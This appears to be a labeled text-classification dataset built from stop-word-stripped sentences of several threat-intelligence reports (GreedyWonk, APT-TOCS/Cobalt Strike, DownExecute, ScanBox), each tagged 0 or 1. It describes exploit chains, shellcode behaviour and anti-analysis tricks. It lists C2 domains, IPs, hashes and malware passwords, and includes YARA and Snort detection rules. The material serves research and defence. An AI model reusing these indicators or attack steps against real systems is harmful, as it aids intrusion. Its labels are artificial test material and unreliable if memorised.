But breaking exploit 's ASLR-bypass measures prevent current in-the-wild exploit functioning	0
GreedyWonk targets previously unknown vulnerability Adobe Flash	0
The vulnerability permits attacker overwrite vftable pointer Flash object redirect code execution	1
The attack uses known ASLR bypasses	1
Details techniques available previous blog post subject ( '' Non-ASLR modules '' section )	0
For Windows XP attackers build return-oriented programming ( ROP ) chain MSVCRT ( Visual C runtime ) gadgets hard-coded base addresses English ( '' en '' ) Chinese ( '' zh-cn '' '' zh-tw '' )	1
On Windows 7 attackers use hard-coded ROP chain MSVCR71.dll ( Visual C++ runtime ) user Java 1.6 hard-coded ROP chain HXDS.dll ( Help Data Services Module ) user Microsoft Office 2007 2010	1
Java 1.6 longer supported receive security updates	0
In addition MSVCR71.dll ASLR bypass variety widely exploited code-execution vulnerabilities exist Java 1.6	0
That 's FireEye strongly recommends upgrading Java 1.7	0
The Microsoft Office HXDS.dll ASLR bypass patched end 2013	0
More details bypass addressed Microsoft 's Security Bulletin MS13-106 accompanying blog entry	0
FireEye strongly recommends updating Microsoft Office 2007 2010 latest patches	0
The shellcode downloaded ActionScript GIF image	1
Once ROP marks shellcode executable using Windows ' VirtualProtect function downloads executable via InternetOpenURLA InternetReadFile functions	1
Then writes file disk CreateFileA WriteFile functions	1
Finally runs file using WinExec function	1
Once exploit succeeds PlugX/Kaba remote access tool ( RAT ) payload MD5 hash 507aed81e3106da8c50efb3a045c5e2b installed compromised endpoint	1
This PlugX sample compiled Feb. 12 one day first observed indicating deployed specifically campaign	0
This PlugX payload configured following command-and-control ( CnC ) domains Sample callback traffic follows Both java.ns1 [	1
] name adservice.no-ip [	0
] org resolved 74.126.177.68 Feb. 18 2014	0
Passive DNS analysis reveals domain wmi.ns01.us previously resolved 103.246.246.103 July 4 2013 July 15 2013 192.74.246.219 Feb. 17 2014	0
java.ns1 [	0
] name also resolved 192.74.246.219 February 18	0
Further research uncovered number older malware samples connecting domain wmi.ns01 [ ] us	1
The Poison Ivy variants connected domain wmi.ns01 [ ] us following unique configuration properties We found related Poison Ivy sample ( MD5 8936c87a08ffa56d19fdb87588e35952 ) '' java7 '' password dropped Adobe Flash exploit ( CVE-2012-0779 )	1
In previous incident visitors Center Defense Information website ( www.cdi [	1
] org - also organization involved defense matters - redirected exploit server 159.54.62.92	1
This exploit server hosted Flash exploit file named BrightBalls.swf ( MD5 1ec5141051776ec9092db92050192758 )	0
This exploit turn dropped Poison Ivy variant	1
In addition using password '' java7 '' variant configured mutex similar pattern '' YFds* & ^ff '' connected CnC server windows.ddns [ ] us	1
Using passive DNS analysis see domains windows.ddns [	0
] us wmi.ns01 [	0
] us resolved 76.73.80.188 mid-2012	0
During another earlier compromise www.cdi.org website visitors redirected Java exploit test.jar ( MD5 7d810e3564c4eb95bcb3d11ce191208e )	1
This jar file exploited CVE-2012-0507 dropped Poison Ivy payload hash ( MD5 52aa791a524b61b129344f10b4712f52 )	1
This Poison Ivy variant connected CnC server ids.ns01 [ ] us	1
The domain ids.ns01 [	0
] us also overlaps domain wmi.ns01 [	0
] us IP 194.183.224.75	0
The Poison Ivy sample referenced ( MD5 fd69793bd63c44bbb22f9c4d46873252 ) delivered via exploit chain began redirect Center European Policy Studies ( www.ceps [ ] )	1
In case visitors redirected www.ceps [ ] Java exploit hosted shop.fujifilm [ ]	1
In certainly coincidence also observed www.arce [ ] org ( one sites redirecting current Flash exploit ) also redirect visitors Java exploit shop.fujifilm [ ] 2013	1
This threat actor clearly seeks compromises websites organizations related international security policy defense topics non-profit sociocultural issues	0
The actor either maintains persistence sites extended periods time able re-compromise periodically	0
This actor also early access number zero-day exploits including Flash Java deploys variety malware families compromised systems	1
Based observations conclude actor tradecraft abilities resources remain credible threat least mid- term	0
Recently ANTIY Labs detected APT attack targeting government agency China	0
The Shellcode communication conducted depending Beacon mode generated basis automatic attack detection platform - Cobalt Strike	0
This kind attack pattern disguising non - malicious real file host target sending network heartbeat package every 60 seconds also send data information via Cookie field features attack pattern designed evade detection security software interception firewall targeted host	1
Considering relationship attack Cobalt Strike platform name APT - TOCS ( TOCS refers Threat Cobalt Strike )	0
The core step APT - TOCS downloading script functionalities Shellcode downloads field data memory operation calling powershell.exe.The decrypted data field executable Shellcode generated Cobalt Strike ( An automatic attack testing platform )	1
After loading script Shellcode Analysis Group ANTIY series correlation analysis found PE program maybe act guiding executable file similar attacks	0
The loaded Shellcode script used call command line add certain field encrypted date memory run	0
The decrypted date turns executable Shellcode generated Cobalt Strike	0
The related script loaded via guiding PE program vulnerability	0
This kind attack pattern several features including running memory hard disk writing operations communicating via Beacon multi - beacon communication acceptable several Beacons work simultaneously	0
Such attack launched without support vector file fact depends network projection laterally move internal network required conducting attack	0
So bring great difficulties forensic work	0
It important note Sandboxes know disabling fight kind attack	0
It seems attack capability APT - TOCS close APT - level	0
However relied automatic attack testing platform instead abilities attack team	0
2.1 Leading files sample downloading APT - TOCS used " powershell.exe " execute Shellcode scripts realize remote control targeted system	1
The analysts Antiy thought attacker might know several remote injection methods script downloading privilege directly making scrip executed host using security vulnerabilities	0
Meanwhile found following binary leading attack files ( hereinafter referred Sample A ) used similar attacks	0
2.2 Key mechanism The core part APT - TOCS relies encrypted data scripts ( hereinafter referred Sample B ) downloaded PowerShell	0
Figure 1 consists various derivation relationships major module functionalities	0
2.3 Analysis major sample ( Sample B ) APT - TOCS The content ( Here omitted content base64 ) Sample B follows	0
The functionality part script decrypting encrypted content base64 decompressing Gzip resulting module 1 using PowerShell download execute	0
2.4 Analysis script 1 The content script 1 follows	0
The functionality part decrypting data base64 encryption getting module 1 writing process powershell.exe executing operating	1
2.5 Analysis module 1 The functionality module follows calling function wininet module connecting network downloading operations module 2 ; executing downloading memory	0
Figure 6 shows using request HTTP GET get file http://146.0.43.107/hfYn	0
2.6 Analysis module 2 Module 2 established listed system process rundll32.exe	0
Data written module 3	0
Though data module 3 started " MZ " belong PE files	0
Instead Shellcode backdoor functionality	0
2.7 Analysis module 3 The module might connect following 2 addresses port 80	0
 146.0.***. * * * ( Romania )  dc.******69.info ( 146.0.***. * * * ) ( Romania ) Sending request data receiving return data	0
The decryption IP domains accessing addresses " XOR 0x69 "	0
Judging module strings system functions module belongs backdoor program send GET request designated addresses heartbeat packages using Cookie fields 60 seconds ' interval	1
The heartbeat package data includes check code process ID system version IP address computer name account whether 64 bit process	0
Then transmits making use RSA BASE64 encryption	0
Analysis APT - - Attack That Focusing China 's Government Agency As process ID check code different transmitted heartbeat package data different time	0
The check code calculated using process ID millisecond process system startup	0
The algorithm follows	0
The encrypted heartbeat package used Cookie field transmit	0
3 The authentication analysis technology sources attack The leading PE files Sample_A Sample B associated analysts Antiy CERT used exactly method PowerShell	0
However eliminate possibility Sample_A positive connection attack due high standardization relevant scripts	0
We still consider series attack incidents based comprehensive analysis	0
The attacker might exploit following ways control target host social engineering e - mails file bundling exploiting system application vulneratbilities lateral movement intranet	0
We found " Beacon " strings analyzing " Module 1 "	0
According existed experience doubted Shellcode closely related automatic attack testing platform Cobalt Strike	0
Therefore analysts carried comparison analysis Beacon generated Cobalt Strike authenticated relationships	0
Cobalt Strike GUI framework penetration tool based metasploit	0
The business version integrates following characteristics service scan automatic overflow multi - mode port espionage various Trojan generation phishing attack site clone target information obtaining automatic browser attack	0
3.1 Comparison Module 1 We compared module 1 payload generated using Beacon found following different data Head data request file name IP address	0
The left sample module 1 right module generated Beacon	0
We lead conclusion comparison module 1 generated Beacon	0
The screenshot data package request follows	0
3.2 Comparison disassembling commands module 2 Our analysts compared sample module 2 relevant files Beacon found disassembling commands exactly exception functionality code including XOR encryption entry downloading system DLL obtaining function address function calling modes	0
The following lists three points	0
3.3 Comparison analysis module 3 data package The following figure GET request comparison module generated sample module 3 Beacon	0
Here see use Cookie transmit encrypted send requests actively every 60 seconds	1
The data package heartbeat	1
3.4 Characteristics Cobalt Strike Using Cobalt Strike attack execute various operations targeted systems downloading uploading files executing designated programs injecting keyboard recorder executing commands via PowerShell importing PowerShell script executing commands via CMD accessing system passwords	1
Cobalt Strike following characteristics	0
With automated test platform Cobalt Strike attack penetration penetrate firewall approach attackers used control targeted host covert undetectable ; 's attack various platforms Windows Linux Mac etc ; 's formidable adversary Trusted Computing Cloud Detection Sandbox Detection	1
According traces past believe threat active 5 years ; unfortunately n't powerful detection production methods defeat malicious attack till	0
The reason CERT Analysis Team ANTIY classified APT - TOCS APT incidents 's kind targeted attack ( one features APT attack ) anti - detection functions also conceal	1
Compared APT incidents past APT attack case n't cost much attackers n't responsible coding	0
With application commercial attack platform attackers saved cost attack also vulnerability built joint function provided relevant attack platform make attackers easy injection	0
As result nations organizations without elite hacker groups abundant capital also launch kind APT attack via attack pattern mentioned case	0
Meanwhile 's difficult us tracing facing modeled attack	0
One leaders Information Security area - Bruce Schiner said " big events information security happened people tend treat example cyber warfare	0
It 's ridiculous	0
From point view 's happening going happen tactics physical warfare applied cyber warfare	0
It 's important note attack capabilities widely distributed attackers take full advantages certain technology especially computer technology make attack powerful automated " Obviously highly automated commercial platform realized high speed spread attack capability ( exceeded anticipation )	0
We remind relevant parties confronting risk large scale diffusion network armaments led low cost attack capability	0
The commercial penetration attack detecting platform two sides one hand check network environment systems effectively hand nations organizations industries limited budget costs much	0
Given situation related parties conduct communication additionally doubt offensive party defensive party supported superpowers superpowers prevent attack technique widely distributing	0
The incident mentioned difference cases detected past shows way realize national informatizaion must fight serious security challenges confronting ; 's also good opportunity Chinese people enterprises demonstrate faith efforts made conquer challenge	0
Cobalt Strike business version Armitage penetration testing software Metasploit figure interface written Java	0
Armitage carry automatic attacks combining known exploits Metasploit	0
It integrates free version Armitage bt5 kali linx powerful functionality adding Payload Beacon	0
The first release time Cobalt Strike June 2012	0
Author Cobalt Strike Raphael Mudge Raphael Mudge founder Strategic Cyber LLC Washington DC based company creates software red teams	0
He created Armitage Metasploit Sleep programming language IRC client jIRCii	0
Previously Raphael worked security researcher US Air Force penetration tester even invented grammar checker sold Automattic	0
His work appeared Hakin9 USENIX ; login Dr.	0
Dobb 's Journal cover Linux Journal Fox sitcom Breaking In	0
Raphael regularly speaks security topics provides red team support many cyber defense competitions	0
Education background Syracuse University Michigan Technological University Current position Strategic Cyber LLC Delaware Air National Guard Skills software development information security object - oriented design distributed system figure interface computer network design blog system social engineering security research	0
Supported organizations	0
Collegiate Cyber Defense Competition ( CCDC ) North East CCDC 2008 - 2015 Mid Atlantic CCDC 2011 - 2015 Pacific Rim CCDC 2012 2014 South East CCDC - 2014 Western Regional CCDC - 2013 National CCDC 2012 - 2014 Projects	0
Published works	0
The Design Proofreading Software Service Agent - based Traffic Generation Contribution	0
Projects	0
Reference linking	0
https://plus.google.com/116899857642591292745/posts （google+） https://github.com/rsmudge ( GitHub ) https://www.youtube.com/channel/UCJU2r634VNPeCRug7Y7qdcw ( youtube ) http://www.oldschoolirc.com/ https://twitter.com/rsmudge http://www.hick.org/~raffi/index.html http://www.blackhat.com/html/bh-us-12/speakers/Raphael-Mudge.html http://www.linkedin.com/in/rsmudge Antiy Labs professional next - generation security - testing engine R&D enterprise	0
Antiy 's engines provide ability detect various viruses malware network security products mobile devices used ten well known security vendors	0
Antiy 's engines embedded tens thousands firewalls tens millions mobile phones world	0
Antiy Labs awarded " Best Protection " prize AV - TEST 2013	0
Based engines sandboxes background systems Antiy Labs continue provide traffic - based anti - APT solutions enterprises	0
More information antivirus engine http://www.antiy.com ( Chinese ) http://www.antiy.net ( English ) More information anti - APT products http://www.antiy.cn Antiy	0
pwc.blogs.com Updated Apr 27th 2015 27 April 2015 By Tom Lancaster Follow @tlansec This short report details techniques used series attacks mostly Israel based organisations	0
The decoy documents filenames used attacks suggest intended targets include organisations political interests influence Israel Palestine	0
Although unable link campaign already documented open source bears similarities described others previously[1],[2 ]	0
The earliest samples campaign identified date back summer 2014	0
The number samples discovered relatively small scale infrastructure suggest attackers limited resources conduct attacks	0
Our investigation begins taking look following file ecc240f1983007177bc5bbecba50eea27b80fd3d14fd261bef6cda10b8ffe1e9	0
According analysis published malwr.com[3 ] file originally named ' Israel Homeland Defense Directory 2015 _ Secured_.exe ' executed following decoy document presented	0
The initial file case self extracting RAR file contains three components including decoy document ( case PDF shown ) malware	0
Further inspection malware extracted showed n't family analysts recognised	0
This coupled nature decoy document used led us take depth look malware associated infrastructure	0
We 'd like give special thanks Eyal Sela ClearSky Security collaborative efforts research	0
The common way malware packaged via self extracting RAR file; however attackers also appear used number solutions drop malware including Visual Basic based wrapper Auto IT based wrapper	0
In terms malware delivered 's likely 's done via spearphishing	0
For example also several occasions VirusTotal ' ITW ' tab suggests original dropper available download 3rd party website	0
In case sample discussed introduction see	0
Pomf.se relatively low profile file sharing / hosting website currently based Sweden	0
The use Pomf.se relatively low profile file sharing / hosting website currently based Sweden	0
The use low key file sharing sites appears feature campaign far tell similar sites used way	0
This conjunction nature related files discovered ( directly executable files ) means likely malware primarily delivered via spear phishing attempts rather method	0
In analysis 'll go file SHA256 hash ecc240f1983007177bc5bbecba50eea27b80fd3d14fd261bef6cda10b8ffe1e9	0
We 've chosen refer malware ' DownExecute ' due .pdb string left malware ( leaving debug paths malware seems fashionable moment … )	0
All variants DownExecute ' malware 've identified come packaged following fashion	0
From samples analysed far decoy application included never used binary presumably included anyone taking cursory look file conclude fact real deal	0
Whilst cURL[4 ] binary included used internet connectivity 's currently unclear attackers chose use method adding connectivity file	0
Some binaries also self signed	0
So malware ? Not much – 's downloader	0
Before execution malware makes couple checks avoid analysis including checking presence debugger using IsDebuggerPresent well checking presence VirtualBox looking device name \\.\VBoxMiniRdrDN	1
The malware also checks presence several anti virus solutions well processes including word ' security '	1
The malware proceeds decrypt basic configuration data including command & control domain information origin infection tracked via ID	0
Meanwhile malware begins calling home whilst also keeping log actions plaintext file created folder binary executed	1
It appears though clue main functionality malware name ( downloads executes ) files offers little else attacker	1
The DownExecute malware used way attackers gain initial foothold victim machine	0
The basic information reported back malware would also certainly allow attacker way triage infections ensure reached intended victim rather researcher	1
We n't great visibility post compromise activity stage; however number malware samples communicate infrastructure DownExecute samples	0
It 's unreasonable infer fully featured backdoors likely 2nd stage malware families used conjunction DownExecute	0
Specifically 've observed well documented Xtreme RAT Poison Ivy malware families use domain names DownExecute	0
The Poison Ivy passwords observed group ' admin2014 ' ' admin!@#$% "	0
The vast majority infrastructure terms hostnames observed associated attacks dynamic DNS domains primarily associated ip.com	0
This provider popular several Middle Eastern threat actors tracked PwC 's intelligence team	0
In terms size infrastructure used campaign using tools described 's also fairly small shown Maltego graph	0
The attackers made unusual choice respect hosting providers used malicious infrastructure	0
Most domains time writing indeed historically pointed IP address space owned Host Sailor geo located Belize	0
Many threat actors Middle East 're familiar extremely volatile IP hosting owing fact infrastructure likely hosted networks	0
This remote hosting therefore somewhat bucks trend hosted networks	0
This remote hosting therefore somewhat bucks trend actors see region	0
As mentioned number reports[5 ] attackers often use C&C domains contain phrases relevant targets make appear legitimate	0
With mind performed simple analysis domain names used campaign identify legitimate organisations impersonated	0
For full list C&Cs used please see Appendix B.	0
As shown appears theme number Israeli news organisations used C&C themes hence probably targeted	0
So believe campaign focused Israeli companies ? Perhaps entirely	0
Whilst number documents clearly aimed Israeli nationals using political military themes one lures[6 ] included Arabic language decoy document pictured	0
The document question discusses alleged leak information relating Abbas leader Palestine Liberation Organization	0
Whilst subject clearly key interest parties region fact attackers sent Arabic language version story may indicate recipient expected fluent Arabic possibly therefore less likely Israeli rather someone another adjacent region	0
Whilst case 're unable attribute set activity specific group entity Middle East bear significant resemblance many attacks seen Middle East previously documented	0
Specifically following aspects campaign remind us existing write ups Middle Eastern campaigns	0
The fact attackers chose develop dropper may indicative biggest problem conducting network intrusions getting foot door – particularly seems though still prefer fully featured Poison Ivy Xtreme RAT backdoors 2nd stage malware families	0
When pivoted looked earliest examples DownExecute malware first samples could find compiled June 2014	0
We reason believe case threat actor tampered compile time samples samples discovered identified shortly compiled	0
As believe campaign using downloader malware going approximately 12 months	0
SHA256 rule DownExecute_A meta	0
author = " PwC Cyber Threat Operations @tlansec " date = " 2015 04 " reference = " http://pwc.blogs.com/cyber_security_updates/2015/04/attacks israeli palestinia n interests.html " description = " Malware often wrapped / protected best run memory " strings	0
$ winver1 = " win 8.1 " $ winver2 = " win Server 2012 R2 " $ winver3 = " win Srv 2012 " $ winver4 = " win srv 2008 R2 " $ winver5 = " win srv 2008 " $ winver6 = " win vsta " $ winver7 = " win srv 2003 R2 " $ winver8 = " win hm srv " $ winver9 = " win Strg srv 2003 " $ winver10 = " win srv 2003 " $ winver11 = " win XP prof x64 edt " $ winver12 = " win XP " $ winver13 = " win 2000 " $ pdb1 = " D:\\Acms\\2\\docs\\Visual Studio 2013\\Projects\\DownloadExcute\\DownloadExcute\\Release\\DownExecute.pdb " $ pdb2 = " d:\\acms\\2\\docs\\visual studio 2013\\projects\\downloadexcute\\downloadexcute\\downexecute\\json\\rapidjson\\writer.h " $ pdb3 = " \\acms\\2\\docs\\visual studio 2013\\projects\\downloadexcute\\downloadexcute\\downexecute\\json\\rapidjson\\internal / stack.h " $ pdb4 = " \\downloadexcute\\downexecute\\ " $ magic1 = " Win Get Version Info Name Error " $ magic2 = " P@$sw0rd$nd " $ magic3 = " $ t@k0v2rF10w " $ magic4 = " |*|123xXx(Mutex)xXx321|*|6 21 2014 03:06PM " wide $ str1 = " Download Excute " ascii wide fullword $ str2 = " EncryptorFunctionPointer % " $ str3 = " % s\\%s.lnk " $ str4 = " Mac:%s Cpu:%s HD:%s " $ str5 = " feed back responce host " $ str6 = " GET Token host " $ str7 = " dwn md5 err " condition	0
( $ winver * ) ( $ pdb * ) ( $ magic * ) 2 ( $ str * ) Network IDS alert http ( msg " [ PwC CTD ] Unclassified Middle Eastern Actor DownExecute URI ( /dw / gtk)"; flow established to_server; urilen:7; content:" / dw / gtk"; http_uri; depth:7; content:"GET " ; http_method; content:!"User Agent:"; http_header; content:!"Referer:"; http_header; http_method; content:!"User Agent:"; http_header; content:!"Referer:"; http_header; reference md5,4dd319a230ee3a0735a656231b4c9063; classtype trojan activity; metadata tlp WHITE author @ipsosCustodes; sid:99999901; rev:2015200401; ) alert http ( msg " [ PwC CTD ] Unclassified Middle Eastern Actor DownExecute URI ( /dw / setup)"; flow established to_server; urilen:>8; content:" / dw / setup"; http_uri; depth:9; content:"POST " ; http_method; reference md5,4dd319a230ee3a0735a656231b4c9063; classtype trojan activity; metadata tlp WHITE author @ipsosCustodes; sid:99999902; rev:2015200401; ) alert http ( msg " [ PwC CTD ] Unclassified Middle Eastern Actor DownExecute Headers"; flow established to_server; urilen:>7; content:"Accept * /*"; http_client_body; content:"Content Type multipart / form data\; boundary= " ; http_header; content " ci_session="; http_cookie; depth:11; content " POST"; http_method; content:!"Referer:"; http_header; content:!"User Agent:"; http_header; reference md5,4dd319a230ee3a0735a656231b4c9063; classtype trojan activity; metadata tlp WHITE author @ipsosCustodes; sid:99999903; rev:2015200401; ) Evernote makes easy remember things big small everyday life using computer tablet phone web	0
Terms Service Privacy Policy	0
Please e - mail us threatintelligence@uk.pwc.com version report additional indicators welcome distribute long public channels ( TLP - GREEN )	0
We observed actors amending ScanBox framework evade existing public signatures detailed	0
Security researchers often made mistake assuming specific tool observed used espionage attacks representative activity single actor	0
More frequently however many identifying distinct groups attackers sharing toolsets cybercrime world	0
One toolset ScanBox framework shared number groups conduct espionage attacks	0
Evidence suggests groups include behind recent Forbes Anthem attacks	0
This short paper outlines current perspectives previously discussed espionage groups currently using framework hint 5th player getting game	0
ScanBox performs keylogging users visit compromised website without requiring malware deployed collect great deal information used tailor future attacks In October published details ScanBox tool set	1
Since encountered 24 additional sites compromised framework	0
Over time observed changes code novel techniques executing	0
We also received number tip offs researchers well queries victims directly targeted using framework	0
We would like extend thanks individuals contributions towards research	0
The following diagram shows links tools targets groups discussed previous blog newer information since come light allows us accurately associate groups known threat actors	0
Between clusters 've seen strategic web compromises designed target users following countries	0
Tactical Intelligence Bulletin – TLP WHITE Since last post several alterations ScanBox code base including new modules changes avoid signature based detection well extra techniques try identify whether scanned real machines researchers	0
In cases able watch developers update test variants framework even come across server - side code tested budding hackers	0
Our findings detailed	0
Following previous post ScanBox1 watched clusters activity outlined close interest well keeping eye new adopters ScanBox framework	0
For n't read last entry framework excellent work Jaime Blasco2 preceded ScanBox framework written JavaScript PHP allows attacker perform reconnaissance key logging visitors compromised websites without requiring malware downloaded installed	1
The framework remained use since initial analyses published analysis code public reporting well infrastructure used host ScanBox infections given us better picture clusters activity identified earlier blog	0
In addition four websites previously identified hosting malicious code 've identified 24 websites hosting framework	0
Anonymised data relating countries sectors affected given appendix A.	0
Broadly ScanBox framework codebase remained however slight nuances aspects code software attackers choose search	0
In cases attackers included software checks within ScanBox code tends original list filenames ( Appendix C )	0
In cases attackers customise list presumably based things 're expecting find	0
For example adding removing additional security products based predominant software providers target region	0
It 's also worth noting standard list includes quite lot software less relevant security ( examples include WinRAR iTunes WinZip )	0
Some may included order help attackers try identify real victims vs researchers / sandboxes / honeypots	0
An example list shown following screenshot	0
In one cluster ScanBox activity instead checking specific files per method attackers implemented different method tracking files drives present victim machine	1
The first piece new functionality attackers build possible list drive names ( A - Z ) scan existence drive	0
They check files directly either instead checking presence list folder names	0
In case rather determining security software present check would mainly useful assisting attacker identifying victim 's operating system	0
This could used tailor future attacks ( i.e.	0
I deploy malware bypass UAC ? Should I send malicious documents targeting CVE-2012 - 0158 ? )	0
Also bizarrely attackers check path ' Program Files ( x80236 ) ' – anyone knows corresponds please get touch let us know	0
As stated earlier features original ScanBox code probably designed help analysing results distinguish honeypots / analysis environments real - world victims	0
The newly added variables include	0
Updates evade signatures Possibly response previous report 've seen groups using ScanBox alter content modules evade detection	0
Attackers read reports help attack3 also evade detection	0
One change URI formats used deliver stolen key log data obvious URLs	0
/k.php?data=[KeyloggerData ] To subtle URLs	0
/[KeyloggerData].jpg We also note following release signature detect phrase " No Java Disable " present number related frameworks attackers changed " No Disable "	0
In previous entry ScanBox described four clusters activity – section includes updates clusters	0
Previously able cluster activity based infrastructure used associated malware sufficient number samples cluster based differences implementation code used ScanBox case	0
The recently published FBI flash alert # A-000049-MW4 cited domain names previously referenced blog related actor known Deep Panda 'll get minute	0
The link appears made use DerUsbi malware family though know used several espionage actors	0
What interesting potential overlap target selection cluster targets behind recently reported Forbes compromise5,6	0
Checking Google SafeBrowsing results * .googlecaches.com shows domain used distribution malicious code significant period previous blog entry	0
This includes distribution via gokbayrak.com	0
Looking whether domains IP addresses observed delivering malicious software via gokbayrak.com shows also observed delivering malware via 88.80.190[.]133	0
This IP address cited iSight 's reporting Forbes breach	0
In fact IP address 88.80.190.133 involved compromise 3 websites SafeBrowsing shows affected googlecaches.com	0
The three sites targeted 0-day used Forbes attack also observed distributing malware via googlecaches[.]com - therefore believe 's likely group previously described ' Cluster 1 ' behind Forbes compromise	0
We use similar techniques explore actors tasking Cluster 1	0
In screenshot websites delivering malware via gokbayrak.com saw domain name macanna.com[.]tw also used distribute malware page	0
Whilst macanna.com[.]tw appears legitimate site also observed command control destination malware	1
The malware sample question hash 3b8d7732de3b3c8823d241e7cd3185c4	0
The sample also communicates happynewyear.dns04[.]com turn resolves IP address 115.23.172[.]151 hosts large number malicious host names	0
These following hostnames activity associated actor best known TH3Bug7 - named choice Poison Ivy password	0
Their malware samples present cluster	0
This cluster relates threat actor referred Deep Panda CrowdStrike confirmed recent blog post8	0
In turn widely believed relate incident Anthem described Krebs post9	0
The graph shows links we11point.com domain name news.foundationssl[.]com seen CrowdStrike blogpost	0
The Krebs article also points toward possible ( although explicit ) links domain allegedly used Anthem hack ( we11point.com ) Cluster 2 shared WHOIS details we11point.com registered domain - seller ' li2384826402@yahoo.com ' On would sufficient associate two clusters useful note ' softer ' overlap	0
Cluster 3 remains mystery unfortunately code used instance slim line version since widely - used – unclear behind compromise using domain name	0
We 'd previously missed link Cluster 4 – malware widely known ' EvilGrab ' ' Vidgrab '	0
From view point malware exclusively used one group known CrowdStrike Stone Panda10	0
In addition four clusters outlined within 24 additional compromises identified believe least 3 distinct groups using framework	0
In 2013 paper ' From Quartermaster Sunshop'11 FireEye described concept Digital Quartermaster kind malware supply chain intrusions skilled team would develop toolsets range attackers deploy	0
The shared use ScanBox may match quite well hypothesis indeed even extent naming schema overlaps iSight refer actor behind Forbes breach Codoso suggest publically known ' Sunshop '	0
In likelihood relates series blogs byFireEye refer series web compromises 2013 SunShop12 campaign	0
Although notice correlation immediately good overlap groups 've described clusters activity described sharing Flash 0-day early 2014 Symantec13	0
Although groups since begun using framework first groups use framework ( clusters 1 - 4 ) correspond quite nicely existing Symantec blog	0
For reference 've overlaid ScanBox clusters likely clusters Symantec created behind scenes blog well popular names	0
Please note vendor way grouping activity together mappings given best efforts basis	0
In examples ScanBox deployments discussed far believe scripts deployed anyone visited websites interest given sector attacker able compromise– attackers waited victims visit compromised site	0
However one group attackers using ScanBox framework actively sending e - mails potential victims e - mails contain links websites hosting ScanBox	1
We believe attackers covered existing clusters 1 4 code differs used elsewhere	0
This method sending links rather waiting visiting specific compromised website two main advantages	0
This group differs others based following characteristics	0
So far identified four low key websites belonging small companies based United States Canada abused fashion	0
At one point investigation infrastructure hosting ScanBox code identified server appeared used development testing purposes	0
On occasion server side code publicly accessible allowing us gain insights development testing phase attack using ScanBox	0
This also included ScanBox framework 's detailed reconnaissance developer	0
We noted developer repeatedly uploading modified versions VirusTotal presumably attempt improve evasion anti - virus	0
We believe developer part core group access original implementation instead another actor likely rebuilding ScanBox samples find online	0
The screenshot left version currently development possible attacker corresponding screenshot right public article15	0
The publication threat information allows us draw links different campaigns tools malware need careful links consider significant ensure 're confident information 's publically available derived	0
The summary view overlaps web based tools / exploits targets different threat actors different datasets may able draw different conclusions	0
Last time identified three possible hypotheses explain overlap ScanBox users blog based data available settle one conclusions	0
" 2	0
Selections actors share resources per previous observations similar kits security vendors	0
" Specifically key conclusions	0
What clear specific resources ( web - based exploits ) appear shared others ( primarily malware families ) sometimes kept within specific cluster	0
Snort Signatures – TLP WHITE alert tcp $ EXTERNAL_NET - $ HOME_NET ( msg:"--[PwC CTD ] -- MultiGroup - ScanBox Targetted Watering Holes Content ( plugin_pdf_ie ( ) ) " ; flow established from_server ; file_data ; content:"plugin_pdf_ie ( ) " ; classtype trojan- activity ; reference url pwc.blogs.com / cyber_security_updates/2014/10/scanbox- framework-whos-affected-and-whos-using-it-1.html ; metadata tlp WHITE author CDD ; sid xxxxxx ; rev:2015021901 ; ) alert tcp $ EXTERNAL_NET - $ HOME_NET ( msg:"--[PwC CTD ] -- MultiGroup - ScanBox Watering Hole Content ( .item(0).appendChild(iframe_tag ) ) " ; flow established from_server ; file_data ; content:".item(0).appendChild(iframe_tag ) " ; classtype trojan - activity ; reference url pwc.blogs.com / cyber_security_updates/2014/10/scanbox - framework - whos- affected-and-whos-using-it-1.html ; metadata tlp WHITE author CDD ; sid xxxxxx ; rev:2015021901 ; ) alert tcp $ EXTERNAL_NET - $ HOME_NET ( msg:"--[PwC CTD ] -- MultiGroup - ScanBox Targetted Watering Holes Content ( var version\;var ax\;var e\;try{axo = new ActiveXObject ) " ; flow established from_server ; file_data ; content:"var version\;var ax\;var e\;try{axo = new ActiveXObject " ; classtype trojan - activity ; reference url pwc.blogs.com / cyber_security_updates/2014/10/scanbox - framework - whos- affected-and-whos-using-it-1.html ; metadata tlp WHITE author CDD ; sid xxxxxx ; rev:2015021901 ; ) alert tcp $ EXTERNAL_NET - $ HOME_NET ( msg:"--[PwC CTD ] -- MultiGroup - ScanBox Watering Hole Content ( document.getElementsByTagName('head').item(0).appendChild(form_tag)\ ; ) " ; flow established from_server ; file_data ; content:"document.getElementsByTagName('head').item(0).appendChild(form_tag)\ ; " ; classtype trojan - activity ; reference url pwc.blogs.com / cyber_security_updates/2014/10/scanbox - framework - whos- affected-and-whos-using-it-1.html ; metadata tlp WHITE author CDD ; sid xxxxxx ; rev:2015021901 ; ) alert tcp $ EXTERNAL_NET - $ HOME_NET ( msg:"--[PwC CTD ] -- MultiGroup - ScanBox Watering Hole Content ( return ( ( ) ? ' x- ' ) + Math.floor(Math.random ( ) * 99999)\ ; ) " ; flow established from_server ; file_data ; content:"return ( ( ) ? ' x- ' ) + Math.floor(Math.random ( ) * 99999)\ ; " ; classtype trojan - activity ; reference url pwc.blogs.com / cyber_security_updates/2014/10/scanbox - framework - whos- affected-and-whos-using-it-1.html ; metadata tlp WHITE author CDD ; sid xxxxxx ; rev:2015021901 ; ) alert tcp $ EXTERNAL_NET - $ HOME_NET ( msg:"--[PwC CTD ] -- MultiGroup - TH3BUG Non - Targetted Groups Watering Hole Code ( Chr(CInt(ns(i ) ) Xor n ) ) " ; flow established from_server ; file_data ; content:"Chr(CInt(ns(i ) ) Xor n ) " ; classtype trojan - activity ; reference url pwc.blogs.com / cyber_security_updates/2014/10/scanbox - framework - whos- affected-and-whos-using-it-1.html ; metadata tlp WHITE author CDD ; sid xxxxxx ; rev:2015021901 ; ) Where site referenced via phishing opposed ' Watering Hole ' based activity excluded following table	0
Where assigned cluster discussed document given ' Cluster [ Letter ] ' intended names groups	0
Where associated group listed ' unknown ' field	0
Fortinet F - PROT F - Secure f - secure2011 IKARUS Immunet iTunes JiangMin Kaspersky_2012 Kaspersky_2013 Kaspersky_Endpoint_Security_8 mcafee_enterprise Mse Norman Norton Nprotect Outpost PC_Tools QuickHeal Rising Rising_firewall sophos SQLServer Sunbelt SUPERAntiSpyware Symantec_Endpoint12 symantec - endpoint Trend2013 ViRobot4 VirusBuster vmware - client vmware - server WinRAR winzip For - depth coverage including full details analysis behind blog well additional indicators used detect similar samples queries please give us shout threatintelligence@uk.pwc.com	0
The information contained document prepared matter interest information purposes constitute professional advice	0
